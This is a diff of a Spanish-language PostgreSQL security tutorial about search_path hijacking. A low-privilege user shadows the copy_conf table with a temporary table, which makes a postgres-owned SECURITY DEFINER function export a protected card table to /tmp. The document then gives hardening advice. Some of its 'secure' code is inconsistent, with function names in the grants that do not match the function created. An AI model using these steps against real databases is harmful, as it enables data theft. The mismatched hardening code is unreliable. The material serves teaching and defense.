@@ -438,13 +438,12 @@ BEGIN
     -- Obtiene la configuración. ¡OJO! Filtra SOLO por tabla_nombre.
     SELECT c.ruta_guardad, c.estatus
     INTO   v_ruta, v_status
-    FROM   copy_conf AS c
+    FROM   copy_conf AS c --- ⚠️ VULNERABILIDAD: → dependerá del search_path real por no especificar el esquema     
     WHERE  c.tabla_nombre = p_tabla_nombre
 		   and c.esquema =  p_eschema_tabla		
     LIMIT  1;	
-	
-	-- ⚠️ VULNERABILIDAD: COPY SIN ESQUEMA → dependerá del search_path real
-    -- Aún usando %I para el identificador, el nombre NO está calificado.	
+
+
     v_query_exec := format('COPY %I.%I TO %L CSV HEADER', p_eschema_tabla, p_tabla_nombre, v_ruta);
     -- RAISE NOTICE '---> %', v_query_exec;	
 
@@ -466,8 +465,75 @@ $$;
 
 ```
 
-###  consultamos la funcion
-```
+ 
+
+### Ataque (usuario con pocos privilegios)
+
+> El atacante crea un **objeto temporal** (vista o tabla) **con el mismo nombre** para **redirigir** la resolución.
+
+```sql
+-- para esto ya existia el usuario basico 
+create user user_hijacking with password '123123';
+
+-- Conéctate como un usuario "regular" que tenga TEMP y EXECUTE en la función:
+-- psql -p 5432 -d test -U user_hijacking -h 127.0.0.1
+
+SHOW search_path;
+-- Verás: "$user", public
+-- Recuerda: el orden real es: pg_temp, pg_catalog, "$user", public
+
+ 
+
+-- 1) El atacante se da cuenta que existe la funcion que puede copiar tablas 
+---  y se da cuenta que puede exportar cualquier tablas modificando el comportamiento de  la tabla copy_conf
+user_hijacking@test> select proname,prosrc from pg_proc where prosrc ilike '%copy%';
++-----------------------------------+-----------------------------------------------------------------------------------------------------+
+|              proname              |                                               prosrc                                                |
++-----------------------------------+-----------------------------------------------------------------------------------------------------+
+| pg_copy_physical_replication_slot | pg_copy_physical_replication_slot_a                                                                 |
+| pg_copy_physical_replication_slot | pg_copy_physical_replication_slot_b                                                                 |
+| pg_copy_logical_replication_slot  | pg_copy_logical_replication_slot_a                                                                  |
+| pg_copy_logical_replication_slot  | pg_copy_logical_replication_slot_b                                                                  |
+| pg_copy_logical_replication_slot  | pg_copy_logical_replication_slot_c                                                                  |
+| fn_copy_by_conf                   |                                                                                                    +|
+|                                   | DECLARE                                                                                            +|
+|                                   |     v_ruta   text;                                                                                 +|
+|                                   |     v_query_exec text;                                                                             +|
+|                                   |     v_status boolean;                                                                              +|
+|                                   | BEGIN                                                                                              +|
+|                                   |                                                                                                    +|
+|                                   |     -- Obtiene la configuración. ¡OJO! Filtra SOLO por tabla_nombre.                               +|
+|                                   |     SELECT c.ruta_guardad, c.estatus                                                               +|
+|                                   |     INTO   v_ruta, v_status                                                                        +|
+|                                   |     FROM   copy_conf AS c                                                                          +|
+|                                   |     WHERE  c.tabla_nombre = p_tabla_nombre                                                         +|
+|                                   |    and c.esquema =  p_eschema_tabla                                                                +|
+|                                   |     LIMIT  1;                                                                                      +|
+|                                   |                                                                                                    +|
+|                                   | -- ⚠️ VULNERABILIDAD: COPY SIN ESQUEMA → dependerá del search_path real                             +|
+|                                   |     -- Aún usando %I para el identificador, el nombre NO está calificado.                          +|
+|                                   |     v_query_exec := format('COPY %I.%I TO %L CSV HEADER', p_eschema_tabla, p_tabla_nombre, v_ruta);+|
+|                                   |     -- RAISE NOTICE '---> %', v_query_exec;                                                        +|
+|                                   |                                                                                                    +|
+|                                   |     IF v_ruta IS NULL THEN                                                                         +|
+|                                   |         RAISE EXCEPTION 'No existe configuración para la tabla %', p_tabla_nombre;                 +|
+|                                   |     END IF;                                                                                        +|
+|                                   |                                                                                                    +|
+|                                   |     IF v_status IS NOT TRUE THEN                                                                   +|
+|                                   |         RAISE NOTICE 'Export deshabilitado para %', p_tabla_nombre;                                +|
+|                                   |         RETURN;                                                                                    +|
+|                                   |     END IF;                                                                                        +|
+|                                   |                                                                                                    +|
+|                                   |                                                                                                    +|
+|                                   |     EXECUTE v_query_exec;                                                                          +|
+|                                   |                                                                                                    +|
+|                                   |     RAISE NOTICE 'Export completado: tabla=% ruta=%', p_tabla_nombre, v_ruta;                      +|
+|                                   | END;                                                                                               +|
+|                                   |                                                                                                     |
++-----------------------------------+-----------------------------------------------------------------------------------------------------+
+(6 rows)
+
+--- 2) Revisa si la funcion el Owner = postgres que es superuser y es Security = definer
 postgres@test# \df+ public.fn_copy_by_conf
 List of functions
 +-[ RECORD 1 ]--------+-------------------------------------------+
@@ -485,66 +551,52 @@ List of functions
 | Internal name       | NULL                                      |
 | Description         | NULL                                      |
 +---------------------+-------------------------------------------+
-```
 
-### Ataque (usuario con pocos privilegios)
-
-> El atacante crea un **objeto temporal** (vista o tabla) **con el mismo nombre** para **redirigir** la resolución.
-
-```sql
--- para esto ya existia el usuario basico 
-create user user_hijacking with password '123123';
-
--- Conéctate como un usuario "regular" que tenga TEMP y EXECUTE en la función:
--- psql -p 5432 -d test -U user_hijacking -h 127.0.0.1
-
-SHOW search_path;
--- Verás: "$user", public
--- Recuerda: el orden real es: pg_temp, pg_catalog, "$user", public
-
-
-
-
-
--- 1) El atacante se da cuenta que existe la funcion y analiza su estructura
---- se da cuenta que puede exportar  tablas con la tabla copy_conf
-user_hijacking@test> select prosrc from pg_proc where proname = 'fn_copy_by_conf';
-+---------------------------------------------------------------------------------------------+
-|                                           prosrc                                            |
-+---------------------------------------------------------------------------------------------+
-|                                                                                            +|
-| DECLARE                                                                                    +|
-|     v_ruta   text;                                                                         +|
-|     v_status boolean;                                                                      +|
-| BEGIN                                                                                      +|
-|     -- Obtiene la configuración. ¡OJO! Filtra SOLO por tabla_nombre.                       +|
-|     SELECT c.ruta_guardad, c.estatus                                                       +|
-|     INTO   v_ruta, v_status                                                                +|
-|     FROM   copy_conf AS c                                                                  +|
-|     WHERE  c.tabla_nombre = p_tabla_nombre                                                 +|
-|    and c.esquema =  p_eschema_tabla                                                        +|
-|     LIMIT  1;                                                                              +|
-|                                                                                            +|
-|     IF v_ruta IS NULL THEN                                                                 +|
-|         RAISE EXCEPTION 'No existe configuración para la tabla %', p_tabla_nombre;         +|
-|     END IF;                                                                                +|
-|                                                                                            +|
-|     IF v_status IS NOT TRUE THEN                                                           +|
-|         RAISE NOTICE 'Export deshabilitado para %', p_tabla_nombre;                        +|
-|         RETURN;                                                                            +|
-|     END IF;                                                                                +|
-|                                                                                            +|
-|     -- ⚠️ VULNERABILIDAD: COPY SIN ESQUEMA → dependerá del search_path real                 +|
-|     -- Aún usando %I para el identificador, el nombre NO está calificado.                  +|
-|     EXECUTE format('COPY %I.%I TO %L CSV HEADER', p_eschema_tabla, p_tabla_nombre, v_ruta);+|
-|                                                                                            +|
-|     RAISE NOTICE 'Export completado: tabla=% ruta=%', p_tabla_nombre, v_ruta;              +|
-| END;                                                                                       +|
-|                                                                                             |
-+---------------------------------------------------------------------------------------------+
+-- 3) VALIDA SI EL USUARIO PUBLIC TIENE PERMISOS el cual si lo que
+--- significa que el tambien la va poder ejecutar 
+SELECT  
+	DISTINCT
+	a.routine_schema 
+	,grantee AS user_name
+	,a.routine_name 
+	,b.routine_type
+	,privilege_type 
+FROM information_schema.routine_privileges as a
+LEFT JOIN 
+	information_schema.routines  as b on a.routine_name=b.routine_name
+where  
+	NOT a.routine_schema in('pg_catalog','information_schema') 
+	AND a.grantee in('PUBLIC')  and a.routine_name = 'fn_copy_by_conf'
+ORDER BY a.routine_schema,a.routine_name ;
++----------------+-----------+-----------------+--------------+----------------+
+| routine_schema | user_name |  routine_name   | routine_type | privilege_type |
++----------------+-----------+-----------------+--------------+----------------+
+| public         | PUBLIC    | fn_copy_by_conf | FUNCTION     | EXECUTE        |
++----------------+-----------+-----------------+--------------+----------------+
 (1 row)
 
---- 2 ) Intenta ejecutar la funcion lo que si tiene permiso 
+
+---4 ) Valida si el usuario tiene permisos de public , esto porque el usuario public tiene el permiso por default
+postgres@test# SELECT has_schema_privilege('public', 'public', 'CREATE');
++----------------------+
+| has_schema_privilege |
++----------------------+
+| t                    |
++----------------------+
+(1 row)
+
+
+-- 5 ) REvisa si tiene permiso para crear tablas temporales, esto porque el usuario public tiene el permiso por default
+select * from has_database_privilege('user_hijacking','test','temp');
++------------------------+
+| has_database_privilege |
++------------------------+
+| t                      |
++------------------------+
+(1 row)
+
+
+--- 6 ) Intenta ejecutar la funcion lo que si tiene permiso 
 SELECT public.fn_copy_by_conf('public','customers_cards');
 NOTICE:  Export deshabilitado para customers_cards
 +-----------------+
@@ -554,12 +606,16 @@ NOTICE:  Export deshabilitado para customers_cards
 +-----------------+
 (1 row)
 
+----7  intenta consultar la tabla
+user_hijacking@test> select * from public.customers_cards;
+ERROR:  permission denied for table customers_cards
+Time: 0.620 ms
 
---- 2) Intenta validar las columnas usando la vista information_schema.columns , pero no le permite porque tiene una validacion de permisos
+ 
+--- 8) Intenta validar las columnas usando la vista information_schema.columns , pero no le permite porque tiene una validacion de permisos
 SELECT table_schema, table_name,column_name,data_type,is_nullable,character_maximum_length,numeric_precision, numeric_scale FROM information_schema.columns 
 WHERE table_name in('customers_cards','copy_conf')
 ORDER BY ordinal_position;
-
 +--------------+------------+-------------+-----------+-------------+--------------------------+-------------------+---------------+
 | table_schema | table_name | column_name | data_type | is_nullable | character_maximum_length | numeric_precision | numeric_scale |
 +--------------+------------+-------------+-----------+-------------+--------------------------+-------------------+---------------+
@@ -567,11 +623,11 @@ ORDER BY ordinal_position;
 (0 rows)
 
  
---- 3) revisa la query que se usa para la vista information_schema.columns y modifica la query quitando la validación 
+--- 9) revisa la query que se usa para la vista information_schema.columns y modifica la query quitando la validación 
  select * from pg_views where viewname = 'columns';
 
 
---- 4  ) usa la query modificada 
+--- 10 ) usa la query modificada 
  SELECT  
     (nc.nspname)::information_schema.sql_identifier AS table_schema,
     (c.relname)::information_schema.sql_identifier AS table_name,
@@ -634,8 +690,6 @@ ORDER BY ordinal_position;
 +--------------+-----------------+------------------+--------------+-------------+-----------+--------------------------+---------------------------------------+
 
 
-
-
 --- 5 )El atacante Recreo la tabla de copy_conf pero en una tabla temporal
 
 CREATE TEMP TABLE copy_conf (
@@ -651,22 +705,13 @@ CREATE TEMP TABLE copy_conf (
 INSERT INTO pg_temp.copy_conf (esquema, tabla_nombre, ruta_guardad, estatus)
 VALUES ('public', 'customers_cards', '/tmp/dump_tabla_customers_cards.csv', true);
 
-
-
  
-
 -- 2) Ejecutar la función vulnerable
 SELECT public.fn_copy_by_conf('public','customers_cards');
 
-
-
--- La función con SECURITY DEFINER y sin search_path fijo
--- resolverá primero en pg_temp → customers_cards (la VIEW TEMPORAL)
--- que internamente lee bank.customers_cards.
--- Resultado: se exporta a /tmp/cards.csv con privilegios del owner.
 ```
 
-> 🔥 **Impacto**: Aunque “parece” que copiamos una tabla temporal, **en realidad** el atacante **exfiltra** la tabla real (`bank.customers_cards`) porque la VIEW temporal la expone.  
+> 🔥 **Impacto**: Aunque “parece” que copiamos una tabla temporal, **en realidad** el atacante **exfiltra** la tabla real (`customers_cards`) en el esquema pg_temp   
 > **Mismo nombre, misma función, distinto objeto según `search_path`**. Integridad y confidencialidad comprometidas.
 
 
@@ -679,58 +724,62 @@ SELECT public.fn_copy_by_conf('public','customers_cards');
 *   **Calificar** siempre con esquema el objeto a copiar
 *   Validar que la tabla existe **exactamente** donde dice la configuración
 *   **Revocar** `EXECUTE` a `PUBLIC` y otorgar solo al rol de la app
-*   (Opcional) **Revocar** `TEMP` si el usuario no necesita temporales
+*   (Opcional) **Revocar** `TEMP` a `PUBLIC`
 
 ### Función segura (usa `copy_conf` correctamente)
 
 ```sql
-CREATE OR REPLACE FUNCTION public.fn_copy_by_conf_secure(p_tabla_nombre text)
+-- drop  FUNCTION public.fn_copy_by_conf(p_eschema_tabla TEXT, p_tabla_nombre TEXT);
+CREATE OR REPLACE FUNCTION public.fn_copy_by_conf(p_eschema_tabla TEXT, p_tabla_nombre TEXT)
 RETURNS void
 LANGUAGE plpgsql
-SECURITY DEFINER
+SET client_min_messages = notice
 SET search_path = public, pg_temp   -- search_path controlado y determinista
+SECURITY DEFINER
 AS $$
 DECLARE
-    v_esquema text;
-    v_ruta    text;
-    v_status  boolean;
-    v_exists  oid;
+    v_ruta   text;
+    v_query_exec text;
+    v_status boolean;
 BEGIN
-    -- Obtiene configuración completa (incluye esquema)
-    SELECT c.esquema, c.ruta_guardad, c.estatus
-    INTO   v_esquema, v_ruta, v_status
-    FROM   public.copy_conf AS c
-    WHERE  c.tabla_nombre = p_tabla_nombre
-    LIMIT  1;
 
-    IF v_esquema IS NULL THEN
+    -- Obtiene la configuración. ¡OJO! Filtra SOLO por tabla_nombre.
+    SELECT c.ruta_guardad, c.estatus
+    INTO   v_ruta, v_status
+    FROM   public.copy_conf AS c --- especifica  el esquema al objeto
+    WHERE  c.tabla_nombre = p_tabla_nombre
+		   and c.esquema =  p_eschema_tabla		
+    LIMIT  1;	
+	
+
+    v_query_exec := format('COPY %I.%I TO %L CSV HEADER', p_eschema_tabla, p_tabla_nombre, v_ruta);
+    -- RAISE NOTICE '---> %', v_query_exec;	
+
+    IF v_ruta IS NULL THEN
         RAISE EXCEPTION 'No existe configuración para la tabla %', p_tabla_nombre;
     END IF;
 
     IF v_status IS NOT TRUE THEN
-        RAISE NOTICE 'Export deshabilitado para %. Estatus=FALSE', p_tabla_nombre;
+        RAISE NOTICE 'Export deshabilitado para %', p_tabla_nombre;
         RETURN;
     END IF;
 
-    -- Verificar que la tabla existe exactamente en ese esquema
-    SELECT to_regclass(format('%I.%I', v_esquema, p_tabla_nombre)) INTO v_exists;
-    IF v_exists IS NULL THEN
-        RAISE EXCEPTION 'El objeto %.% no existe', v_esquema, p_tabla_nombre;
-    END IF;
+    EXECUTE v_query_exec;
 
-    -- COPY calificado SIEMPRE con esquema
-    EXECUTE format('COPY %I.%I TO %L CSV HEADER', v_esquema, p_tabla_nombre, v_ruta);
-
-    RAISE NOTICE 'Export completado: %.% → %', v_esquema, p_tabla_nombre, v_ruta;
+    RAISE NOTICE 'Export completado: tabla=% ruta=%', p_tabla_nombre, v_ruta;
 END;
 $$;
 
+
+
 -- Endurecimiento de permisos:
-REVOKE EXECUTE ON FUNCTION bank.fn_copy_by_conf_secure(text) FROM PUBLIC;
-GRANT  EXECUTE ON FUNCTION bank.fn_copy_by_conf_secure(text) TO app_role;
+REVOKE EXECUTE ON FUNCTION fn_copy_by_conf_secure(text) FROM PUBLIC;
+REVOKE TEMP ON DATABASE postgres FROM PUBLIC;
+GRANT  EXECUTE ON FUNCTION fn_copy_by_conf_secure(text) TO app_role;
 
 -- (Opcional) Si tu user_hijacking NO requiere temporales:
 -- REVOKE TEMP ON DATABASE postgres FROM user_hijacking;
+
 ```
 
 ### Intento de ataque (fallido)
@@ -777,8 +826,8 @@ SELECT bank.fn_copy_by_conf_secure('customers_cards');
 6.  **Pruebas obligatorias de hijacking**  
     Crea `TEMP VIEW/TABLE` con el mismo nombre y verifica que la función **mantiene** el esquema correcto.
 
-7.  **Limita `CREATE TEMP` si es posible**  
-    Si el rol no requiere temporales: `REVOKE TEMP ON DATABASE <db> FROM <rol>;`
+7.  Revoca `CREATE TEMP` a `PUBLIC`
+    Si el rol no requiere temporales: `REVOKE TEMP ON DATABASE <db> FROM PUBLIC;`
 
 
 ---
